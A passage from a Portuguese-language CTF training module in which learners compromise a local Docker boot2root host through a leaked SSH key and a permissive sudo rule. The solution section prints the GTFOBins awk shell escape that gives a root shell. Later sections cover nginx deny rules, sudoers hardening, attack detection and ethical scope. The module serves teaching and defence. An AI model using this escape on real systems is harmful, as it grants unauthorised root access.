+Não procure exploit. A pergunta de ouro da escalação em Linux é: *o que esta conta pode rodar como root?* O comando é `sudo -l`. Rode e leia com atenção o que aparece **sem** pedir senha (`NOPASSWD`).
+</Hint>
+
+<Hint title="Dica 2 — do comando comum ao shell de root">
+Um comando liberado no `sudo` vira root se ele souber **executar outro comando**. O `awk` processa texto, mas tem uma função `system()` que roda comandos do sistema. Procure `awk` no GTFOBins, seção **Sudo** — a receita é um `BEGIN{...}` que chama o shell.
+</Hint>
+
+<Solution title="Solução — confira só depois de tentar">
+A enumeração de privilégio de `mike` começa (e, nesta máquina, termina) em `sudo -l`:
+
+```console
+mike@target:~$ sudo -l
+Matching Defaults entries for mike on target:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:...
+
+User mike may run the following commands on target:
+    (root) NOPASSWD: /usr/bin/awk
+```
+
+`mike` pode rodar o `awk` **como root, sem senha**. O `awk` é uma linguagem de processamento de texto — e tem a função `system()`, que executa comandos do sistema operacional. O bloco `BEGIN{...}` roda antes de ler qualquer entrada. Juntando (a receita do <GlossaryTerm term="GTFOBins">GTFOBins</GlossaryTerm> para o `awk` na seção Sudo):
+
+```console
+mike@target:~$ sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+FLAG{...}        # a flag de root — mande no cartão da tarefa
+```
+
+`uid=0`: root pleno. O `sudo` rodou o `awk` como root, e o shell que o `awk` abriu herdou o root — é o <GlossaryTerm term="shell escape">shell escape</GlossaryTerm>: escapar de um comando restrito para um shell completo. A máquina caiu.
+
+**Lição:** o salto vertical foi uma única regra de `sudo` permissiva num binário que executa código. O defensor não deveria tê-la deixado ali — é o degrau "WannaCry" da sua máquina, o caminho conhecido-perigoso que ficou aberto.
+</Solution>
+
+<FlagInput task="flag-root" />
+
+### 5.5 Desligar a máquina
+
+Você comprometeu o host das duas pontas. Saia dos shells aninhados e destrua o contêiner (ele sobe com `--rm`, então some ao parar) e a imagem:
+
+```console
+# dentro do host, saia dos shells:
+# exit     (sai do shell de root do awk)
+mike@target:~$ exit
+$ docker rm -f ctf-guiado && docker rmi ctf-guiado:local
+```
+
+Guarde suas anotações (os comandos e as saídas): elas são a matéria-prima de um <GlossaryTerm term="writeup">writeup</GlossaryTerm> — o relato de como você resolveu a máquina, que você vai aprender a transformar em relatório no 8.4.
+
+## 6. Variações e aprofundamento
+
+**Outros footholds pela web.** Aqui a web vazou uma chave via `robots.txt`. Variações comuns do mesmo degrau: um diretório com **listagem ligada** (`autoindex on`) expondo um backup (foi o caso do 8.5), um `/.git/` exposto que entrega o código-fonte e segredos, um painel com **credencial padrão** (`admin:admin`), ou um arquivo de config legível com uma senha. O reflexo é sempre content discovery: o que o servidor expõe além da página inicial?
+
+**Outros shell escapes no `sudo`.** O `awk` é um entre dezenas. `sudo vim`, `sudo less`, `sudo find`, `sudo env`, `sudo tar`, `sudo python` — quase todo binário que executa código ou abre um subshell vira root se liberado no `sudo`. O <GlossaryTerm term="GTFOBins">GTFOBins</GlossaryTerm> cataloga a receita de cada um. Por isso "troque o `awk` por outro comando no sudoers" não corrige nada: a causa-raiz é a regra permissiva, não o binário escolhido.
+
+**Escalação além do `sudo`.** Numa máquina mais difícil, o degrau 2 pode ser um binário **SUID** incomum, uma **Linux capability** como `cap_setuid` (foi o 8.3), uma **tarefa agendada** (cron) que roda como root um script que você consegue editar, ou um serviço vulnerável rodando como root. O método não muda: enumere (SUID, `getcap`, cron, serviços), levante a hipótese, teste.
+
+**Reverse shell vs. shell direto.** Aqui você já tinha um terminal SSH, então o `sudo awk` abriu um shell local. Quando o foothold vem por uma falha web (ex.: upload de <GlossaryTerm term="web shell">web shell</GlossaryTerm>), muitas vezes você precisa de uma <GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm> — fazer o alvo se conectar de volta a você — para ter um terminal interativo. É a mesma ideia de "conseguir uma shell", por um caminho diferente.
+
+## 7. Erros comuns
+
+- **`ssh` recusa a chave: "UNPROTECTED PRIVATE KEY FILE".** A chave que você baixou está legível por outros. `chmod 600 mike_key` resolve — o SSH se recusa a usar chave privada com permissão frouxa, de propósito.
+- **`ssh` pede senha mesmo com a chave.** Confira que usou `-i mike_key` (o caminho certo da chave), a porta `-p 2222` (a publicada, não a 22) e o usuário `mike`. Neste host a senha nem funciona (só chave); se ele pede senha, a chave não foi aceita — quase sempre é permissão do arquivo ou caminho errado.
+- **Esquecer de re-enumerar como `mike`.** Muita gente consegue o foothold e trava, tentando escalar "no escuro". O primeiro comando depois de virar `mike` é `sudo -l` (e `id`, grupos, SUID). A máquina te diz o caminho; você só precisa perguntar.
+- **`sudo /usr/bin/awk ...` não vira root.** O comando precisa estar liberado **como root** e `NOPASSWD` no `sudo -l`, e o caminho tem de bater com o do sudoers (`/usr/bin/awk`). Rodar só `awk ...` (sem `sudo`) abre um shell do próprio `mike`, não de root.
+- **Abrir todas as dicas de cara.** A tentação é abrir `<Hint>` e `<Solution>` antes de tentar. Se fizer isso, você treina a copiar, não a resolver. Tente primeiro; a rede de proteção está aí para quando travar de verdade.
+- **`docker` pede permissão.** Rode com `sudo docker ...` ou adicione seu usuário ao grupo `docker` (lembre do 6.2: estar no grupo `docker` já é, por si só, um caminho a root no host). No WSL com Docker Desktop isso costuma já estar pronto.
+
+## 8. Boas práticas e segurança
+
+A visão fecha, como sempre, pela defesa: a mesma máquina que você quebrou mostra, degrau a degrau, o que o dono deveria ter feito. O atacante precisou dos **dois** degraus; o defensor derruba o ataque cortando **qualquer um**.
+
+### 8.1 Degrau 1 — o segredo exposto na web
+
+**Nunca deixe segredos sob o diretório servido pela web.** Uma chave privada, um `.env`, um backup de config: se está em `/var/www/html`, está publicado. Segredos ficam fora do web root, em um cofre (secrets manager) ou em variáveis de ambiente restritas ao processo. E uma chave privada **jamais** é distribuída pela web — se o CI precisa dela, ela vai por um canal seguro, com permissão mínima.
+
+**`robots.txt` não é mecanismo de segurança.** Ele só pede a buscadores que não indexem; qualquer um o lê e vê os caminhos. Listar um caminho "secreto" ali é entregá-lo. Para esconder de fato, use autenticação e autorização no servidor — não uma lista pública do que você não quer que vejam.
+
+```text
+# o certo: a chave sai do web root e o acesso é negado no servidor
+# (nginx) — defesa em profundidade, não um robots.txt pedindo gentileza
+location ~ /\.(git|env)   { deny all; }
+location ~ \.(bak|key|pem)$ { deny all; }
+```
+
+### 8.2 Degrau 2 — a regra de `sudo` permissiva
+
+`NOPASSWD` num binário que executa código arbitrário é dar root a quem puder rodá-lo. Audite o `sudoers` e aplique o <GlossaryTerm term="least privilege">menor privilégio</GlossaryTerm>:
+
+```console
+# ver o que cada regra realmente permite:
+$ sudo grep -r '' /etc/sudoers /etc/sudoers.d/
+
+# corrigir: remover a regra perigosa
+$ sudo rm /etc/sudoers.d/mike
+```
+
+Se a conta precisa mesmo rodar algo como root, dê um binário que **não** permita shell escape (confira o <GlossaryTerm term="GTFOBins">GTFOBins</GlossaryTerm> antes de liberar qualquer coisa — `awk`, `find`, `vim`, `less`, `tar`, `env` e `python` estão fora de questão), e evite `NOPASSWD` genérico. Remover este elo quebra a máquina inteira: sem ele, `mike` não chega a root.
+
+### 8.3 Detecção — a sequência, não o evento
+
+Isolados, um `GET` num arquivo `.key`, um login SSH e um `sudo awk` passam batidos. É a **sequência** que denuncia: um acesso a `/private/id_ed25519`, seguido de um login SSH bem-sucedido daquela conta e, logo depois, um `sudo awk 'BEGIN{system(...)}'` chamando shell — isso é um padrão que o `auditd` e um EDR reconhecem como escalação de privilégio (tática **TA0004** do MITRE ATT&CK). Dois sinais baratos ajudam muito: alertar sobre **downloads de chave privada** servidos pela web e sobre **`sudo` de binários conhecidos por shell escape**.
+
+### 8.4 Higiene de quem treina
+
+A capacidade que você está construindo exige contorno. O contêiner deste módulo é **seu**; qualquer teste fora do seu ambiente exige <GlossaryTerm term="scope">escopo</GlossaryTerm> e autorização por escrito (Trilha 1). Trate o treino com o rigor do trabalho: anote tudo (é o começo do writeup), não leve o vício do "qualquer barulho vale" para um sistema real, e lembre que a mesma chave vazada que te deu `mike` seria, num engajamento de verdade, um achado a reportar — não um troféu.
+
+## 9. Exercícios
+
+Primeiro o quiz de teoria — ele conta para concluir o módulo e cobra o **método** da máquina (o que é boot2root, por que o foothold é recon + credencial, o que o `robots.txt` ensina, por que o `chmod 600`, o que é o shell escape do `sudo`, a re-enumeração e o limite ético), não a decoreba de comandos:
+
+<Quiz task="quiz-final" />
+
+Depois, as duas flags do módulo (seção 5):
+
+- **Flag de usuário (`user.txt`):** recon → content discovery (`robots.txt`) → chave SSH vazada → `chmod 600` → `ssh -i` como `mike`.
+- **Flag de root (`root.txt`):** re-enumerar como `mike` → `sudo -l` → regra `NOPASSWD: awk` → shell escape do GTFOBins → root.
+
+Para ir além, **sem flag** (treino direto):
+
+1. **Feche os dois degraus.** Edite o `Dockerfile`: tire a chave do web root (ou negue o acesso no nginx) e remova a regra de `sudo`. Reconstrua o host e prove que **nenhuma** flag é mais alcançável. Provar que um corte fecha o caminho é a melhor forma de internalizar a defesa.
+2. **Troque o vetor de escalação.** Em vez da regra de `sudo`, dê ao `mike` um binário **SUID** incomum ou uma **capability** (`cap_setuid`, como no 8.3) e resolva de novo. Força você a enumerar outros vetores, não só o `sudo -l`.
+3. **Escreva o writeup.** Documente a resolução (comando, saída, horário) como se fosse entregar a outra pessoa. É o rascunho do relatório que você vai formalizar no 8.4.
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Uma máquina **boot2root** é um host que você ataca de fora até o controle total, colhendo duas flags: `user.txt` (foothold) e `root.txt` (escalação). Elas contam a história **acesso inicial → escalação de privilégio**.
+- A ordem nunca muda: **recon** (nmap) → **enumeração de cada serviço** (content discovery na web) → **foothold** → **re-enumeração local + escalação**. E a regra de ouro: **cada troca de identidade reinicia a enumeração**.
+- Nesta máquina, o foothold foi **recon + credencial achada** (uma chave SSH vazada, apontada por um `robots.txt` indiscreto) — não um exploit. É o vetor mais comum do mundo real, como no **Mirai (2016)**.
+- A escalação foi uma única regra de `sudo` permissiva, explorada por um **shell escape** do **GTFOBins** (`sudo awk 'BEGIN{system("/bin/sh")}'`). Um caminho conhecido-perigoso deixado aberto — o eco do **WannaCry (2017)**, cujo conserto já existia.
+- Defender é **cortar qualquer degrau**: segredos fora do web root, `robots.txt` não é segurança, `sudo` com menor privilégio e sem binários de shell escape — e monitorar a **sequência**, não o evento solto.
+- O limite ético é inegociável: isto só é legítimo porque o alvo é seu e isolado. Fora disso, exige escopo e autorização por escrito.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [GTFOBins](https://gtfobins.github.io/) — o catálogo de binários Unix abusáveis; procure `awk`, `find`, `vim` e veja a seção **Sudo** de cada um.
+- [TryHackMe](https://tryhackme.com/) e [Hack The Box](https://www.hackthebox.com/) — plataformas de máquinas boot2root reais, do nível iniciante ao avançado, para praticar o que você treinou aqui.
+- [UK National Audit Office — WannaCry e o NHS (2017)](https://www.nao.org.uk/reports/investigation-wannacry-cyber-attack-and-the-nhs/) — o relatório oficial do caso da seção 4.
+- [MITRE ATT&CK — Abuse Elevation Control Mechanism: Sudo and Sudo Caching (T1548.003)](https://attack.mitre.org/techniques/T1548/003/) — a técnica exata do degrau 2 desta máquina.
